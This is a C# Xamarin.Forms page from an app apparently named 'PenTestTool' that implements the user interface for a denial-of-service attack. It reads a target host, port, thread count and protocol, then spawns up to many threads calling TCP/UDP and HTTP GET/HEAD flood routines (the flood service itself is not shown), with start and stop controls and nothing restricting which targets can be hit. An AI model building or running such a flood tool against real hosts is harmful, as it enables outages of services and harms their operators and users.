using PenTestTool.Services;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

using Xamarin.Forms;
using Xamarin.Forms.Xaml;

namespace PenTestTool.Pages
{
    [XamlCompilation(XamlCompilationOptions.Compile)]
    public partial class DDoSAttack : ContentPage
    {
        public static bool DDOS_RUNNING = false;
        List<string> logs = new List<string>();
        public DDoSAttack()
        {
            InitializeComponent();

            Title = "DDoS Attack";

            start.Clicked += Start_Clicked;
            //log_viewer.ItemsSource = logs;
        }

        private void Start_Clicked(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(target.Text))
            {
                DisplayAlert("Oops!", "Target cannot be empty.", "Ok");
                return;
            }

            if (string.IsNullOrEmpty(port.Text))
            {
                DisplayAlert("Oops!", "Port number cannot be empty.", "Ok");
                return;
            }

            if (string.IsNullOrEmpty(thread.Text))
            {
                DisplayAlert("Oops!", "Thread number cannot be empty.", "Ok");
                return;
            }

            if (Convert.ToInt16(thread.Text) < 1)
            {
                thread.Text = "1";
            }

            if (thread.Text == "0" || Convert.ToInt16(thread.Text) > 20)
            {
                DisplayAlert("Warning", "Thread more than 20 might exhausting your device. Use it at your own risk.", "Ok");
                //return;
            }

            if (!DDOS_RUNNING)
            {
                //start ddos attack

                string proto = protocol.SelectedItem as string;
                IPAddress IPAddress = null;
                int Thread = Convert.ToInt32(thread.Text);
                int Port = Convert.ToInt16(port.Text);

                if (target.Text.Contains("http"))
                {
                    Uri uri1 = new Uri(target.Text);
                    IPAddress = Dns.GetHostAddresses(uri1.Host)[0];
                }
                else
                {
                    IPAddress = IPAddress.Parse(target.Text);
                }

                Log("Target IP: " + IPAddress.ToString());
                Log("Target Port: " + Port.ToString());
                Log("Thread: " + Thread.ToString());

                DDOS_RUNNING = true;

                switch (proto)
                {
                    case "TCP":
                    case "UDP":
                        Log("Attack Protocol: TCP/UDP");

                        for (int i = 0; i < Thread; i++)
                        {
                            Log("Starting DDoS Thread " + i.ToString());
                            Task.Run(() => DDoSService.TCPUDPDoS(IPAddress, Port, false, data.Text, false, 0));
                        }
                        break;

                    case "HTTP-GET":
                        if (!target.Text.Contains("http"))
                        {
                            DisplayAlert("Oops!", "Unsupported target for HTTP attack. Please insert a valid URL starts with http:// or https://", "Ok");
                            return;
                        }

                        Log("Attack Protocol: HTTP-GET");

                        Uri uri2 = new Uri(target.Text);

                        for (int i = 0; i < Thread; i++)
                        {
                            Log("Starting DDoS Thread " + i.ToString());
                            Task.Run(() => DDoSService.HTTPDoS(IPAddress, Port, false, 0, "GET", uri2.PathAndQuery, uri2.Host, true, false, 30));
                        }
                        break;

                    case "HTTP-HEAD":
                        if (!target.Text.Contains("http"))
                        {
                            DisplayAlert("Oops!", "Unsupported target for HTTP attack. Please insert a valid URL starts with http:// or https://", "Ok");
                            return;
                        }

                        Log("Attack Protocol: HTTP-HEAD");

                        Uri uri3 = new Uri(target.Text);

                        for (int i = 0; i < Thread; i++)
                        {
                            Log("Starting DDoS Thread " + i.ToString());
                            Task.Run(() => DDoSService.HTTPDoS(IPAddress, Port, false, 0, "HEAD", uri3.PathAndQuery, uri3.Host, true, false, 30));
                        }
                        break;

                    default:
                        DisplayAlert("Oops!", "Unsupported protocol. Please select TCP, UDP or HTTP.", "Ok");
                        return;
                        break;
                }

                Log("DDoS Attack in Progress");
                
                start.BackgroundColor = Color.Red;
                start.Text = "Stop Attack";
            }
            else
            {
                //stop DDOS

                Log("DDoS Attack stopped");

                DDOS_RUNNING = false;
                start.BackgroundColor = Color.DarkGreen;
                start.Text = "Start Attack";
            }
        }

        async void Log(string text)
        {
            //logs.Add(text);
        }
    }
}